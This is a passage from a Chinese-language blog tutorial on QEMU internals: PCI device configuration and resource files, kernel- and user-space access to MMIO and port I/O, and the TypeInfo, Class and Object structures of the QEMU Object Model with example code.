<p>总之每个 PCI 设备有一个总线号, 一个设备号, 一个功能号标识。PCI 规范允许单个系统占用多达 256 个总线, 但是因为 256 个总线对许多大系统是不够的, Linux 现在支持 PCI 域。每个 PCI 域可以占用多达 256 个总线. 每个总线占用 32 个设备, 每个设备可以是 一个多功能卡(例如一个声音设备, 带有一个附加的 CD-ROM 驱动)有最多 8 个功能。</p>
<p>PCI 设备通过<code>VendorIDs</code>、<code>DeviceIDs</code>、以及<code>Class Codes</code>字段区分：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v -m -n -s 00:03.0</span><br><span class="line">Device: 00:03.0</span><br><span class="line">Class:  00ff</span><br><span class="line">Vendor: 1234</span><br><span class="line">Device: 11e9</span><br><span class="line">SVendor:        1af4</span><br><span class="line">SDevice:        1100</span><br><span class="line">PhySlot:        3</span><br><span class="line">Rev:    10</span><br><span class="line"></span><br><span class="line">ubuntu@ubuntu:~$ lspci -v -m -s 00:03.0</span><br><span class="line">Device: 00:03.0</span><br><span class="line">Class:  Unclassified device [00ff]</span><br><span class="line">Vendor: Vendor 1234</span><br><span class="line">Device: Device 11e9</span><br><span class="line">SVendor:        Red Hat, Inc</span><br><span class="line">SDevice:        Device 1100</span><br><span class="line">PhySlot:        3</span><br><span class="line">Rev:    10</span><br></pre></td></tr></table></figure>
<p>也可通过查看其<code>config</code>文件来查看设备的配置空间，数据都可以匹配上，如前两个字节<code>1234</code>为<code>vendor id</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ hexdump /sys/devices/pci0000\:00/0000\:00\:03.0/config</span><br><span class="line">0000000 1234 11e9 0103 0000 0010 00ff 0000 0000</span><br><span class="line">0000010 1000 febf c051 0000 0000 0000 0000 0000</span><br><span class="line">0000020 0000 0000 0000 0000 0000 0000 1af4 1100</span><br><span class="line">0000030 0000 0000 0000 0000 0000 0000 0000 0000</span><br></pre></td></tr></table></figure>
<p>查看设备内存空间：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v -s 00:03.0 -x</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">        Subsystem: Red Hat, Inc Device 1100</span><br><span class="line">        Physical Slot: 3</span><br><span class="line">        Flags: fast devsel</span><br><span class="line">        Memory at febf1000 (32-bit, non-prefetchable) [size=256]</span><br><span class="line">        I/O ports at c050 [size=8]</span><br><span class="line">00: 34 12 e9 11 03 01 00 00 10 00 ff 00 00 00 00 00</span><br><span class="line">10: 00 10 bf fe 51 c0 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11</span><br><span class="line">30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>可以看到该设备有两个空间：BAR0为MMIO空间，地址为<code>febf1000</code>，大小为256；BAR1为PMIO空间，端口地址为<code>0xc050</code>，大小为8。</p>
<p>可以通过查看<code>resource</code>文件来查看其相应的内存空间：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ <span class="built_in">ls</span> -la /sys/devices/pci0000\:00/0000\:00\:03.0/</span><br><span class="line">...</span><br><span class="line">-r--r--r--  1 root root 4096 Aug  1 03:40 resource</span><br><span class="line">-rw-------  1 root root  256 Jul 31 13:18 resource0</span><br><span class="line">-rw-------  1 root root    8 Aug  1 04:01 resource1</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p><code>resource</code>文件包含其它相应空间的数据，如resource0（MMIO空间）以及resource1（PMIO空间）：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ <span class="built_in">cat</span> /sys/devices/pci0000\:00/0000\:00\:03.0/resource</span><br><span class="line">0x00000000febf1000 0x00000000febf10ff 0x0000000000040200</span><br><span class="line">0x000000000000c050 0x000000000000c057 0x0000000000040101</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>每行分别表示相应空间的起始地址（start-address）、结束地址（end-address）以及标识位（flags）。</p>
<h2 id="qemu中访问I-O空间"><a href="#qemu中访问I-O空间" class="headerlink" title="qemu中访问I/O空间"></a>qemu中访问I/O空间</h2><p>存在mmio与pmio，那么在系统中该如何访问这两个空间呢？访问mmio与pmio都可以采用在内核态访问或在用户空间编程进行访问。</p>
<h3 id="访问mmio"><a href="#访问mmio" class="headerlink" title="访问mmio"></a>访问mmio</h3><p>编译内核模块，在内核态访问mmio空间，示例代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> addr=ioremap(ioaddr,iomemsize);</span><br><span class="line">readb(addr);</span><br><span class="line">readw(addr);</span><br><span class="line">readl(addr);</span><br><span class="line">readq(addr);<span class="comment">//qwords=8 btyes</span></span><br><span class="line"></span><br><span class="line">writeb(val,addr);</span><br><span class="line">writew(val,addr);</span><br><span class="line">writel(val,addr);</span><br><span class="line">writeq(val,addr);</span><br><span class="line">iounmap(addr);</span><br></pre></td></tr></table></figure>
<p>还有一种方式是在用户态访问mmio空间，通过映射<code>resource0</code>文件实现内存的访问，示例代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    *((<span class="type">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    mmio_read(<span class="number">0x128</span>);</span><br><span class="line">    mmio_write(<span class="number">0x128</span>, <span class="number">1337</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="访问pmio"><a href="#访问pmio" class="headerlink" title="访问pmio"></a>访问pmio</h3><p>编译内核模块，在内核空间访问pmio空间，示例代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/io.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">inb(port);  <span class="comment">//读取一字节</span></span><br><span class="line">inw(port);  <span class="comment">//读取两字节</span></span><br><span class="line">inl(port);  <span class="comment">//读取四字节</span></span><br><span class="line"></span><br><span class="line">outb(val,port); <span class="comment">//写一字节</span></span><br><span class="line">outw(val,port); <span class="comment">//写两字节</span></span><br><span class="line">outl(val,port); <span class="comment">//写四字节</span></span><br></pre></td></tr></table></figure>
<p>用户空间访问则需要先调用<code>iopl</code>函数申请访问端口，示例代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h &gt;</span></span></span><br><span class="line"></span><br><span class="line">iopl(<span class="number">3</span>); </span><br><span class="line">inb(port); </span><br><span class="line">inw(port); </span><br><span class="line">inl(port);</span><br><span class="line"></span><br><span class="line">outb(val,port); </span><br><span class="line">outw(val,port); </span><br><span class="line">outl(val,port);</span><br></pre></td></tr></table></figure>
<p>IOPL（Input/Output Privilege Level）系统调用是一种在Intel x86架构中的特权级别切换机制。在x86架构中，存在四个特权级别（0至3），其中0是最高特权级别，3是最低特权级别。IOPL允许用户态程序访问特权级别为0（内核态）的I/O端口，以执行一些需要系统级别权限的操作，比如直接访问硬件设备。</p>
<h2 id="QOM模型"><a href="#QOM模型" class="headerlink" title="QOM模型"></a>QOM模型</h2><p>QEMU是使用C编写而成,自然没有原生支持类与对象,但QEMU自己实现了一套称为<strong>Qemu Object Model</strong>的技术来实现面向对象</p>
<p>主要由这四个组件构成：</p>
<ul>
<li><code>Type</code>：用来定义一个「类」的基本属性，例如类的名字、大小、构造函数等。</li>
<li><code>Class</code>：用来定义一个「类」的静态内容，例如类中存储的静态数据、方法函数指针等。</li>
<li><code>Object</code>：动态分配的一个「类」的具体的实例（instance），储存类的动态数据。</li>
<li><code>Property</code>：动态对象数据的访问器（accessor），可以通过监视器接口进行检查。</li>
</ul>
<p>其中Property不多做关注,重点理解前三个</p>
<hr>
<p>上面的介绍乍一看还并不是很容易就懂的,用比较易懂的话再说一遍大概就是</p>
<p><code>Type</code>用于<strong>描述</strong>一个类,也就是描述一个具体的设备,由结构体<code>Typeinfo</code>实现,<code>Type</code>用于关联<code>Class</code>与<code>Object</code></p>
<p><code>Class</code>用于描述这个类的通用数据,例如<u>静态数据,方法函数</u>等对于所有类实例都是相同的数据,全局只有一个该<code>class</code></p>
<p><code>object</code>用于描述这个类的动态数据,也就是<u>独属于</u>每一个类实例的数据</p>
<h3 id="TypeInfo-类的基本属性"><a href="#TypeInfo-类的基本属性" class="headerlink" title="TypeInfo - 类的基本属性"></a>TypeInfo - 类的基本属性</h3><p><code>TypeInfo</code> 这一结构体用来定义一个 <code>类</code> 的基本属性，该结构体定义于 <code>include/qom/object.h</code> 当中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * TypeInfo:</span></span><br><span class="line"><span class="comment"> * @name: 类型名.</span></span><br><span class="line"><span class="comment"> * @parent: 父类型名.</span></span><br><span class="line"><span class="comment"> * @instance_size: 对象大小 (#Object 的衍生物). </span></span><br><span class="line"><span class="comment"> *   若 @instance_size 为 0, 则对象的大小为其父类的大小</span></span><br><span class="line"><span class="comment"> * @instance_init: 该函数被调用以初始化对象（译注：构造函数）. </span></span><br><span class="line"><span class="comment"> *   （译注：调用前）父类已被初始化，因此子类只需要初始化他自己的成员。</span></span><br><span class="line"><span class="comment"> * @instance_post_init: 该函数被调用以结束一个对象的初始化，</span></span><br><span class="line"><span class="comment"> *   在所有的 @instance_init 函数被调用之后.</span></span><br><span class="line"><span class="comment"> * @instance_finalize: 该函数在对象被析构时调用. 其在</span></span><br><span class="line"><span class="comment"> *   父类的 @instance_finalize 被调用之前被调用.</span></span><br><span class="line"><span class="comment"> *   在该函数中一个对象应当仅释放该对象特有的成员。</span></span><br><span class="line"><span class="comment"> * @abstract: 若该域为真，则该类为一个虚类，不能被直接实例化。</span></span><br><span class="line"><span class="comment"> * @class_size: 这个对象的类对象的大小 (#Object 的衍生物)</span></span><br><span class="line"><span class="comment"> *   若 @class_size 为 0, 则类的大小为其父类的大小。</span></span><br><span class="line"><span class="comment"> *   这允许一个类型在没有添加额外的虚函数时避免实现一个显式的类型。</span></span><br><span class="line"><span class="comment"> * @class_init: 该函数在所有父类初始化结束后被调用，</span></span><br><span class="line"><span class="comment"> *   以允许一个类设置他的默认虚方法指针.</span></span><br><span class="line"><span class="comment"> *   这也允许该函数重写父类的虚方法。</span></span><br><span class="line"><span class="comment"> * @class_base_init: 在所有的父类被初始化后、但</span></span><br><span class="line"><span class="comment"> *   在类自身初始化前，为所有的基类调用该函数。</span></span><br><span class="line"><span class="comment"> *   该函数用以撤销从父类 memcpy 到子类的影响.</span></span><br><span class="line"><span class="comment"> * @class_data: 传递给 @class_init 与 @class_base_init 的数据,</span></span><br><span class="line"><span class="comment"> *   这会在建立动态类型时有用。</span></span><br><span class="line"><span class="comment"> * @interfaces: 与这个类型相关的接口. </span></span><br><span class="line"><span class="comment"> *   其应当指向一个以 0 填充元素结尾的静态数组</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TypeInfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *parent;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> instance_size;</span><br><span class="line">    <span class="type">void</span> (*instance_init)(Object *obj);</span><br><span class="line">    <span class="type">void</span> (*instance_post_init)(Object *obj);</span><br><span class="line">    <span class="type">void</span> (*instance_finalize)(Object *obj);</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> abstract;</span><br><span class="line">    <span class="type">size_t</span> class_size;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*class_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="type">void</span> (*class_base_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="type">void</span> *class_data;</span><br><span class="line"></span><br><span class="line">    InterfaceInfo *interfaces;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>当我们在 Qemu 中要定义一个<strong>类</strong>的时候，我们实际上需要定义一个 <code>TypeInfo</code> 类型的变量，以下是一个在 Qemu 定义一个自定义类的例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo my_type_info = &#123;</span><br><span class="line">    .name = <span class="string">&quot;my_type&quot;</span>,</span><br><span class="line">    .parent = TYPE_OBJECT,</span><br><span class="line">    .interfaces = (InterfaceInfo[]) &#123;</span><br><span class="line">        &#123; &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> my_register_types(<span class="type">void</span>) &#123;</span><br><span class="line">    type_register_static(&amp;my_type_info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type_init(my_register_types);</span><br></pre></td></tr></table></figure>
<p><code>type_init()</code> 其实就是 <code>constructor</code> 这一 gcc attribute 的封装，其作用就是将一个函数加入到一个 <code>init_array</code> 当中，在 Qemu 程序启动时在进入到 main 函数之前会先调用 <code>init_array</code> 中的函数，因此这里会调用我们自定义的函数，其作用便是调用 <code>type_register_static()</code> 将我们自定义的类型 <code>my_type_info</code> 注册到全局的类型表中。</p>
<h3 id="Class-类的静态内容"><a href="#Class-类的静态内容" class="headerlink" title="Class - 类的静态内容"></a>Class - 类的静态内容</h3><p>当我们通过一个 <code>TypeInfo</code> 结构体定义了一个类之后，我们还需要定义一个 Class 结构体来定义这个类的静态内容，包括函数表、静态成员等，其应当继承于对应的 Class 结构体类型，例如我们若是要定义一个新的机器类，则其 Class 应当继承于 <code>MachineClass</code>。</p>
<p>所有 Class 结构体类型的最终的父类都是 <code>ObjectClass</code> 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ObjectClass:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 所有类的基类.  #ObjectClass 仅包含一个整型类型 handler</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    Type type;</span><br><span class="line">    GSList *interfaces;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *object_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *class_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line"></span><br><span class="line">    ObjectUnparent *unparent;</span><br><span class="line"></span><br><span class="line">    GHashTable *properties;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>下面是一个最简单的示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">myClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    ObjectClass parent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>完成 Class 的定义之后我们还应当在前面定义的 <code>my_type_info</code> 中添加上 Class size 与 Class 的构造函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">my_class_init</span><span class="params">(ObjectClass *oc, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 这里的 oc 参数便是新创建的 Class，全局只有一个该实例</span></span><br><span class="line">    <span class="comment">// 我们应当 cast 为我们自己的 Class 类型，之后再进行相应操作</span></span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo my_type_info = &#123;</span><br><span class="line">    .name = <span class="string">&quot;my_type&quot;</span>,</span><br><span class="line">    .parent = TYPE_OBJECT,</span><br><span class="line">    .class_size = <span class="keyword">sizeof</span>(myClass),</span><br><span class="line">    .class_init = my_class_init,</span><br><span class="line">    .interfaces = (InterfaceInfo[]) &#123;</span><br><span class="line">        &#123; &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Object-类的实例对象"><a href="#Object-类的实例对象" class="headerlink" title="Object - 类的实例对象"></a>Object - 类的实例对象</h3><p>我们还需要定义一个相应的 Object 类型来表示一个实例对象，其包含有这个类实际的具体数据，且应当继承于对应的 Object 结构体类型，例如我们若是要定义一个新的机器类型，其实例类型应当继承自 <code>MachineState</code></p>
<p>所有 Object 结构体类型的最终的父类都是 <code>Object</code> 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Object:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 所有对象的基类。该对象的第一个成员为一个指向 #ObjectClass 的指针。</span></span><br><span class="line"><span class="comment"> * 因为 C 中将一个结构体的第一个成员组织在该结构体的 0 字节起始处，</span></span><br><span class="line"><span class="comment"> * 只要任何的子类将其父类作为第一个成员，我们都能直接转化为一个 #Object.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 因此, #Object 包含一个对对象类的引用作为其第一个成员。 </span></span><br><span class="line"><span class="comment"> * 这允许在运行时识别对象的真实类型</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    ObjectClass *<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">    ObjectFree *<span class="built_in">free</span>;</span><br><span class="line">    GHashTable *properties;</span><br><span class="line">    <span class="type">uint32_t</span> ref;</span><br><span class="line">    Object *parent;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>下面是一个示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">myObject</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    Object parent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>完成 Object 的定义之后我们还应当在前面定义的 <code>my_type_info</code> 中添加上 Object size 与 Object 的构造函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">my_object_init</span><span class="params">(Object *obj)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 这里的 obj 参数便是动态创建的类型实例</span></span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo my_type_info = &#123;</span><br><span class="line">    .name = <span class="string">&quot;my_type&quot;</span>,</span><br><span class="line">    .parent = TYPE_OBJECT,</span><br><span class="line">    .instance_init = my_object_init,</span><br><span class="line">    .instance_size = <span class="keyword">sizeof</span>(myObject),</span><br><span class="line">    .class_size = <span class="keyword">sizeof</span>(myClass),</span><br><span class="line">    .class_init = my_class_init,</span><br><span class="line">    .interfaces = (InterfaceInfo[]) &#123;</span><br><span class="line">        &#123; &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
